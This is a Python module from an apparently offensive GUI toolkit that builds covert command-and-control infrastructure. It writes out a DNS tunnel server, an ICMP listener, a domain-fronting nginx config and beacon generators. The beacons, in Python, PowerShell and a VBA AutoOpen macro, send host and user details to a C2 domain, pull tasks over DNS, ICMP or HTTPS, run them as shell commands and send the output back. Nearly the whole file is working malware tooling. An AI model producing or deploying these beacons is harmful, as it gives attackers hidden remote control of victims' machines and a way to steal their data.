# language: Python, file: modules/covert_c2.py
# covert C2 — DNS tunneling + ICMP exfil + HTTPS domain-fronted beacon
import customtkinter as ctk
import threading
import subprocess
import socket
import struct
import os
import time
import base64
import random
import string
from utils.progress import ProgressTracker


class CovertC2Module:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "covert_c2"
        self.progress = ProgressTracker(log_queue)
        self.sessions = {}

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="COVERT C2",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="DNS tunnel · ICMP exfil · domain-fronted HTTPS · DoH beacon",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # ---- config ----
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)

        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=8)
        self.domain_e = ctk.CTkEntry(r1, placeholder_text="c2 domain (e.g. cdn.example.com)",
                                     width=280, height=32,
                                     fg_color="#05080c", border_color="#1a2332")
        self.domain_e.pack(side="left", padx=(0, 6))
        self.ns_ip = ctk.CTkEntry(r1, placeholder_text="authoritative NS IP",
                                  width=180, height=32,
                                  fg_color="#05080c", border_color="#1a2332")
        self.ns_ip.pack(side="left", padx=(0, 6))
        self.interval = ctk.CTkEntry(r1, placeholder_text="beacon interval (s)",
                                     width=160, height=32,
                                     fg_color="#05080c", border_color="#1a2332")
        self.interval.insert(0, "60")
        self.interval.pack(side="left")

        r2 = ctk.CTkFrame(cfg, fg_color="transparent")
        r2.pack(fill="x", padx=12, pady=(0, 10))
        self.front_e = ctk.CTkEntry(r2, placeholder_text="front domain (e.g. cloudflare.com)",
                                    width=280, height=32,
                                    fg_color="#05080c", border_color="#1a2332")
        self.front_e.pack(side="left", padx=(0, 6))
        self.doh_e = ctk.CTkEntry(r2, placeholder_text="DoH resolver URL",
                                  width=280, height=32,
                                  fg_color="#05080c", border_color="#1a2332")
        self.doh_e.insert(0, "https://1.1.1.1/dns-query")
        self.doh_e.pack(side="left")

        # ---- attack buttons ----
        ctk.CTkLabel(parent, text="Channel operations:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")

        grid = ctk.CTkFrame(parent, fg_color="transparent")
        grid.pack(fill="x", padx=24)

        actions = [
            ("▸ Start DNS Server", self._start_dns_server),
            ("▸ Start ICMP Listener", self._start_icmp_listener),
            ("▸ Start HTTPS Listener", self._start_https_listener),
            ("▸ Start DoH Proxy", self._start_doh),
            ("☣ DNS Beacon Gen", self._gen_dns_beacon),
            ("☣ ICMP Beacon Gen", self._gen_icmp_beacon),
            ("☣ HTTPS Beacon Gen", self._gen_https_beacon),
            ("☣ PowerShell Beacon", self._gen_ps_beacon),
            ("☣ Macro Beacon", self._gen_macro_beacon),
            ("▸ Session List", self._show_sessions),
        ]
        for i, (label, fn) in enumerate(actions):
            ctk.CTkButton(
                grid, text=label, width=200, height=34,
                fg_color="#141a22", hover_color="#1a2332",
                font=ctk.CTkFont(size=11), command=fn
            ).grid(row=i // 5, column=i % 5, padx=4, pady=4)

        # ---- sessions ----
        ctk.CTkLabel(parent, text="Active sessions:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.sess_box = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=11), height=120
        )
        self.sess_box.pack(fill="x", padx=24)

        ctk.CTkLabel(parent, text="Output:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=160
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

    # ==================== DNS C2 ====================
    def _start_dns_server(self):
        """start dnscat2 server or custom DNS C2"""
        domain = self.domain_e.get().strip()
        ns_ip = self.ns_ip.get().strip()
        if not domain:
            self.log.put("[dns] set domain first")
            return

        tid = f"dns-{int(time.time())}"
        self.progress.start(tid, f"DNS tunnel {domain}")

        # dnscat2 server
        self.log.put(f"[dns] launching dnscat2-server for {domain}")
        subprocess.Popen([
            "x-terminal-emulator", "-e",
            f"dnscat2-server {domain}"
        ])

        # also standalone DNS server for custom tunnel
        dns_script = f'''#!/usr/bin/env python3
# albaron DNS tunnel — encodes C2 in TXT/A records
from dnslib.server import DNSServer, DNSHandler, BaseResolver
from dnslib import RR, QTYPE, TXT, A
import base64, json, time

SESSIONS = {{}}

class TunnelResolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname).rstrip(".").lower()
        qtype = request.q.qtype
        # expected: <base32_data>.<session_id>.{domain}
        parts = qname.split(".")
        if len(parts) >= 3 and parts[-len("{domain}".split(".")):] == "{domain}".split("."):
            payload_b32 = parts[0]
            session_id = parts[1] if len(parts) > 1 else "unknown"
            try:
                # pad b32
                padded = payload_b32.upper() + "=" * (-len(payload_b32) % 8)
                data = base64.b32decode(padded).decode(errors="ignore")
                SESSIONS.setdefault(session_id, []).append(data)
                print(f"[dns] {{session_id}}: {{data[:100]}}")
            except Exception as e:
                print(f"[dns] decode err: {{e}}")
            # response = next task or "IDLE"
            task = "IDLE"
            resp = base64.b32encode(task.encode()).decode().rstrip("=")
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=1, rdata=TXT(resp)))
            reply.add_answer(RR(request.q.qname, QTYPE.A, ttl=1, rdata=A("127.0.0.1")))
        else:
            reply.add_answer(RR(request.q.qname, QTYPE.A, ttl=1, rdata=A("127.0.0.1")))
        return reply

if __name__ == "__main__":
    server = DNSServer(TunnelResolver(), port=53, address="0.0.0.0")
    server.start_thread()
    print(f"[dns] serving tunnel for {domain} on :53")
    while True:
        time.sleep(5)
        for sid, msgs in SESSIONS.items():
            print(f"[dns] {{sid}}: {{len(msgs)}} messages")
'''
        with open("/tmp/dns_tunnel.py", "w") as f:
            f.write(dns_script)
        self.log.put("[dns] standalone tunnel written to /tmp/dns_tunnel.py")

    # ==================== ICMP C2 ====================
    def _start_icmp_listener(self):
        """raw ICMP listener — data hidden in echo payload"""
        tid = f"icmp-{int(time.time())}"
        self.progress.start(tid, "ICMP listener")
        script = '''#!/usr/bin/env python3
# albaron ICMP C2 listener — payload hidden in echo request
from scapy.all import sniff, ICMP, IP, send
import json, base64, threading, queue

SESSIONS = {}
TASKS = {}

def handle(pkt):
    if not pkt.haslayer(ICMP):
        return
    if pkt[ICMP].type != 8:  # echo request
        return
    payload = bytes(pkt[ICMP].payload)
    if not payload or payload[:4] != b"SHDW":
        return
    sid = payload[4:12].decode(errors="ignore")
    data = payload[12:]
    try:
        decoded = base64.b64decode(data).decode(errors="ignore")
        SESSIONS.setdefault(sid, []).append(decoded)
        print(f"[icmp] {sid} <- {pkt[IP].src}: {decoded[:120]}")
    except Exception as e:
        print(f"[icmp] decode err: {e}")
    # reply with task
    task = TASKS.get(sid, "IDLE")
    resp_payload = b"SHDW" + sid.encode() + base64.b64encode(task.encode())
    reply = IP(dst=pkt[IP].src)/ICMP(type=0)/resp_payload
    send(reply, verbose=0)

def main():
    print("[icmp] listening for beacons...")
    sniff(filter="icmp", prn=handle, store=False)

if __name__ == "__main__":
    main()
'''
        with open("/tmp/icmp_c2.py", "w") as f:
            f.write(script)
        self.log.put("[icmp] listener written — run: sudo python3 /tmp/icmp_c2.py")
        subprocess.Popen(["x-terminal-emulator", "-e",
                          "sudo python3 /tmp/icmp_c2.py"])

    # ==================== HTTPS domain fronting ====================
    def _start_https_listener(self):
        front = self.front_e.get().strip() or "cloudflare.com"
        self.log.put(f"[https] starting domain-fronted listener (front: {front})")
        self.log.put("[https] setup: nginx reverse proxy with SNI={front}, backend=beacon endpoint")
        nginx_conf = f'''
# /etc/nginx/sites-available/albaron-c2
server {{
    listen 443 ssl http2;
    server_name {front};
    ssl_certificate /etc/letsencrypt/live/{front}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{front}/privkey.pem;
    location /api/v1/telemetry {{
        proxy_pass http://127.0.0.1:8443;
        proxy_set_header Host $host;
    }}
}}
'''
        with open("/tmp/nginx-c2.conf", "w") as f:
            f.write(nginx_conf)
        self.log.put("[https] nginx config → /tmp/nginx-c2.conf")

    def _start_doh(self):
        doh = self.doh_e.get().strip()
        self.log.put(f"[doh] DoH proxy via {doh}")
        self.log.put("[doh] beacon uses DNS-over-HTTPS to hide queries from local DNS")

    # ==================== beacon generators ====================
    def _gen_dns_beacon(self):
        domain = self.domain_e.get().strip() or "c2.example.com"
        interval = self.interval.get().strip() or "60"
        beacon = f'''#!/usr/bin/env python3
# Al-Baron DNS beacon — data exfil via DNS queries
import socket, base64, uuid, subprocess, time, random, os

C2_DOMAIN = "{domain}"
SID = str(uuid.uuid4())[:8]
INTERVAL = {interval}

def encode(data: bytes) -> str:
    # base32, split to DNS-safe labels (<63 chars)
    b32 = base64.b32encode(data).decode().rstrip("=").lower()
    return b32

def beacon_once(task_result: bytes = b""):
    # build query: <chunk1>.<chunk2>.<sid>.<c2_domain>
    payload = encode(task_result)[:180]
    labels = [payload[i:i+60] for i in range(0, len(payload), 60)]
    qname = ".".join(labels + [SID, C2_DOMAIN])
    try:
        socket.gethostbyname(qname)
    except Exception:
        pass

def get_task():
    # task retrieval: query t.<sid>.<domain> for TXT
    try:
        import dns.resolver
        r = dns.resolver.resolve(f"t.{{SID}}.{{C2_DOMAIN}}", "TXT")
        return b"".join(rr.strings).decode()
    except Exception:
        return ""

def main():
    while True:
        task = get_task()
        if task and task != "IDLE":
            try:
                out = subprocess.run(task, shell=True, capture_output=True, timeout=30)
                beacon_once(out.stdout + out.stderr)
            except Exception as e:
                beacon_once(str(e).encode())
        else:
            # heartbeat with host info
            info = f"{{os.uname().nodename}}|{{os.getlogin()}}".encode()
            beacon_once(info)
        time.sleep(INTERVAL + random.randint(-15, 15))

if __name__ == "__main__":
    main()
'''
        with open("beacon_dns.py", "w") as f:
            f.write(beacon)
        self.log.put("[dns] beacon → ./beacon_dns.py")

    def _gen_icmp_beacon(self):
        ns_ip = self.ns_ip.get().strip() or "c2.example.com"
        interval = self.interval.get().strip() or "60"
        beacon = f'''#!/usr/bin/env python3
# Al-Baron ICMP beacon — data hidden in echo payloads
from scapy.all import IP, ICMP, sr1, sniff
import base64, uuid, subprocess, time, random, os

C2 = "{ns_ip}"
SID = str(uuid.uuid4())[:8].encode()
INTERVAL = {interval}

def beacon_send(data: bytes):
    payload = b"SHDW" + SID + base64.b64encode(data)
    pkt = IP(dst=C2)/ICMP(type=8)/payload
    resp = sr1(pkt, timeout=5, verbose=0)
    if resp and resp.haslayer(ICMP) and resp[ICMP].type == 0:
        task = bytes(resp[ICMP].payload)
        if task[:4] == b"SHDW":
            return base64.b64decode(task[12:]).decode(errors="ignore")
    return ""

def main():
    while True:
        info = f"{{os.uname().nodename}}".encode()
        task = beacon_send(info)
        if task and task != "IDLE":
            try:
                out = subprocess.run(task, shell=True, capture_output=True, timeout=30)
                beacon_send(out.stdout + out.stderr)
            except Exception:
                pass
        time.sleep(INTERVAL + random.randint(-10, 10))

if __name__ == "__main__":
    main()
'''
        with open("beacon_icmp.py", "w") as f:
            f.write(beacon)
        self.log.put("[icmp] beacon → ./beacon_icmp.py")

    def _gen_https_beacon(self):
        domain = self.domain_e.get().strip() or "c2.example.com"
        front = self.front_e.get().strip() or "cloudflare.com"
        interval = self.interval.get().strip() or "60"
        beacon = f'''#!/usr/bin/env python3
# Al-Baron HTTPS beacon with domain fronting (SNI={front}, Host={domain})
import requests, uuid, subprocess, time, random, os, base64, json

C2_URL = "https://{front}/api/v1/telemetry"
C2_HOST = "{domain}"
SID = str(uuid.uuid4())[:8]
INTERVAL = {interval}

session = requests.Session()
session.verify = False
session.headers.update({{
    "Host": C2_HOST,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
}})

def beacon(payload: dict) -> dict:
    try:
        data = base64.b64encode(json.dumps(payload).encode()).decode()
        r = session.post(C2_URL, data={{"d": data}}, timeout=15)
        return json.loads(base64.b64decode(r.content).decode())
    except Exception:
        return {{}}

def main():
    while True:
        info = {{
            "id": SID,
            "host": os.uname().nodename,
            "user": os.getlogin(),
            "cwd": os.getcwd(),
        }}
        resp = beacon({{"type": "beacon", "info": info}})
        task = resp.get("task", "")
        if task:
            out = subprocess.run(task, shell=True, capture_output=True, timeout=60)
            beacon({{"type": "result", "id": SID,
                     "out": base64.b64encode(out.stdout + out.stderr).decode()}})
        time.sleep(INTERVAL + random.randint(-15, 15))

if __name__ == "__main__":
    main()
'''
        with open("beacon_https.py", "w") as f:
            f.write(beacon)
        self.log.put("[https] beacon → ./beacon_https.py")

    def _gen_ps_beacon(self):
        beacon = r'''
# PowerShell beacon — DNS exfil + IE COM for HTTP
$sid = [guid]::NewGuid().ToString().Substring(0,8)
$c2 = "c2.example.com"
$interval = 60
while ($true) {
    $info = "$env:COMPUTERNAME|$env:USERNAME"
    $enc = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($info)).Replace('=','').ToLower()
    try { [System.Net.Dns]::GetHostByName("$enc.$sid.$c2") } catch {}
    # task fetch via TXT
    try {
        $dns = Resolve-DnsName -Name "t.$sid.$c2" -Type TXT -ErrorAction SilentlyContinue
        if ($dns -and $dns.Strings -ne "IDLE") {
            $out = Invoke-Expression $dns.Strings 2>&1 | Out-String
            $b = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($out)).Replace('=','').ToLower()
            try { [System.Net.Dns]::GetHostByName("$b.$sid.$c2") } catch {}
        }
    } catch {}
    Start-Sleep -Seconds $interval
}
'''
        with open("beacon.ps1", "w") as f:
            f.write(beacon)
        self.log.put("[ps] beacon → ./beacon.ps1")

    def _gen_macro_beacon(self):
        macro = r'''
' Al-Baron VBA macro beacon
Sub AutoOpen()
    Dim sid As String
    sid = Left(CreateObject("Scriptlet.TypeLib").GUID, 8)
    Dim c2 As String
    c2 = "c2.example.com"
    Dim interval As Integer
    interval = 60
    Do While True
        Dim info As String
        info = Environ("COMPUTERNAME") & "|" & Environ("USERNAME")
        Dim b64 As String
        b64 = EncodeB64(info)
        On Error Resume Next
        CreateObject("WScript.Shell").Run "nslookup " & b64 & "." & sid & "." & c2, 0, False
        On Error GoTo 0
        Application.Wait Now + TimeValue("00:01:00")
    Loop
End Sub

Function EncodeB64(s As String) As String
    Dim b() As Byte
    b = StrConv(s, vbFromUnicode)
    Dim xml As Object
    Set xml = CreateObject("MSXML2.DOMDocument")
    Dim node As Object
    Set node = xml.createElement("b")
    node.DataType = "bin.base64"
    node.nodeTypedValue = b
    EncodeB64 = Replace(Replace(Replace(node.Text, "+", "-"), "/", "_"), "=", "")
End Function
'''
        with open("beacon_macro.bas", "w") as f:
            f.write(macro)
        self.log.put("[macro] beacon → ./beacon_macro.bas")

    def _show_sessions(self):
        self.sess_box.delete("1.0", "end")
        for sid, msgs in self.sessions.items():
            self.sess_box.insert("end", f"{sid}  |  {len(msgs)} msgs\n")
